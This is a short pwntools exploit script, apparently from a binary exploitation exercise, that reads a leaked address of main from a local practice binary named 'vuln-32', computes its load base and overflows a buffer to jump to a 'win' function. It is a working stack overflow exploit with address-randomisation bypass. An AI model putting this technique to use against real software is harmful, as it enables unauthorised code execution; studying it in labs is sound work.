from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil(b'at: ')
main = int(p.recvline(), 16)

elf.address = main - elf.sym['main']

payload = b'x'*32 + p32(elf.sym['win']) + p32(0x0)

p.sendline(payload)
log.info(p.clean())
